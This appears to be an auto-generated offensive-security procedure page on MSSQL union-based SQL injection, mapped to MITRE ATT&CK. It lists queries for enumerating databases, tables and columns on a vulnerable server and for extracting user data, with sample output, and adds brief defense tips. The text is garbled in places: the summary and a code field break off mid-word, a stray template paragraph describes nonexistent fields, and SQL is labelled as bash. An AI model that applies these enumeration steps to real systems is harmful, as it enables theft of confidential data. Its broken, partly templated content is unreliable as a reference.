---
id: a986c4ac-e069-4557-afc1-30dbe14e4417
name: MSSQL Union Based Injection for Database Enumeration
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:33.787024+00:00'
updated_at: '2023-04-10T20:22:44.155173+00:00'
tactics:
- '[[Discovery|TA0007 - Discovery]]'
techniques:
- '[[System Information Discovery|T1082 - System Information Discovery]]'
tags:
- '[[MSSQL Injection]]'
- '[[MSSQL Union Based]]'
commands:
- '[[Extract columns for the table Users]]'
- '[[Extract databases names]]'
- '[[Extract tables from Injection database]]'
- '[[Finally extract the data]]'
---

# MSSQL Union Based Injection for Database Enumeration

## Summary

MSSQL Union Based Injection is a technique used to extract database, tables, and columns information from a vulnerable MSSQL server. An attacker can use this technique to obtain sensitive information such as usernames, passwords, and other confidential data. This attack is performed by injecting ma

## Description

# Description

MSSQL Union Based Injection is a technique used to extract database, tables, and columns information from a vulnerable MSSQL server. An attacker can use this technique to obtain sensitive information such as usernames, passwords, and other confidential data. This attack is performed by injecting malicious SQL code into a vulnerable input field, which can then be used to extract information from the database. The business value of this technique is that it can be used to identify potential targets for further attacks, as well as to gather intelligence on the target's infrastructure.

 

## Requirements

1. Access to a vulnerable MSSQL server

1. Knowledge of SQL injection techniques

 

## Defense

1. Implement input validation and sanitization to prevent SQL injection attacks

1. Use parameterized queries instead of dynamic SQL to prevent injection attacks

1. Limit the privileges of the database user to restrict access to sensitive information

 

## Objectives

1. Enumerate databases, tables, and columns on a vulnerable MSSQL server

1. Identify potential targets for further attacks

1. Gather intelligence on the target's infrastructure

 

# Instructions

1. To extract database names, run 'SELECT name FROM master..sysdatabases'.
To extract tables from a specific database, run 'SELECT name FROM <database_name>..sysobjects WHERE xtype = 'U''.
To extract columns for a specific table, run 'SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '<table_name>')'.
To extract data, run 'SELECT <column_name_1>, <column_name_2> from <table_name>'.

 



**Code**: [[-- extract databases names
$ SELECT name FROM mast]]



> This command provides instructions on how to extract database names, tables, columns, and data. The SQL queries provided in the 'data' field can be used to extract this information. The 'instruction' field provides detailed instructions on how to use these queries. The 'explain' field provides a brief overview of what this command does.



**Command** ([[Extract databases names]]):

```bash
$ SELECT name FROM master..sysdatabases
[*] Injection
[*] msdb
[*] tempdb
```





**Command** ([[Extract tables from Injection database]]):

```bash
$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
[*] Profiles
[*] Roles
[*] Users
```





**Command** ([[Extract columns for the table Users]]):

```bash
$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
[*] UserId
[*] UserName
```





**Command** ([[Finally extract the data]]):

```bash
$ SELECT  UserId, UserName from Users
```



## MITRE ATT&CK Mapping

### Tactics

- [[Discovery|TA0007 - Discovery]]

### Techniques

- [[System Information Discovery|T1082 - System Information Discovery]]

## Commands Used

- [[Extract columns for the table Users]]
- [[Extract databases names]]
- [[Extract tables from Injection database]]
- [[Finally extract the data]]

## Tags

- [[MSSQL Injection]]
- [[MSSQL Union Based]]


